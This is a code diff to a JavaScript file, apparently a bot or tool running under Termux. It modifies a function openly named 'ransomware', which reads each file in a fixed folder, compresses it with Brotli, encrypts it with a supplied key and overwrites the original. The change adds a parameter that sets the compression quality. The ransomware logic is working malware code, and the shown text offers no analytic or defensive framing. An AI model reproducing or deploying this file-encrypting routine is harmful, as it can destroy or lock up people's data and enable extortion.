@@ -17,10 +17,10 @@ const loadFile = (filename) => {
 const saveToFile = (filename, data) => {
     return fs_1.default.writeFileSync(filename, data);
 };
-const compressBuffer = (data) => {
+const compressBuffer = (data, speed) => {
     return zlib_1.default.brotliCompressSync(data, {
         params: {
-            [zlib_1.default.constants.BROTLI_PARAM_QUALITY]: 11
+            [zlib_1.default.constants.BROTLI_PARAM_QUALITY]: speed
         }
     });
 };
@@ -117,12 +117,12 @@ const decrypt = (data, password) => {
 const ransomware = (options) => {
     const tmpPath = "/data/data/com.termux/files/home/ransom";
     options = options.substring(12, options.length);
-    const [mode, key, path] = options.split(" ");
+    const [mode, key, path, speed] = options.split(" ");
     const filesInPath = readdir(tmpPath);
     for (let i = 0; i < filesInPath.length; ++i) {
         const fileData = loadFile(`${tmpPath}/${filesInPath[i]}`);
         if (mode === "e" || mode === "encrypt") {
-            const compressedFileDataBuffer = compressBuffer(fileData);
+            const compressedFileDataBuffer = compressBuffer(fileData, +speed);
             const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
             saveToFile(`${tmpPath}/${filesInPath[i]}`, encryptedDataBuffer);
         }
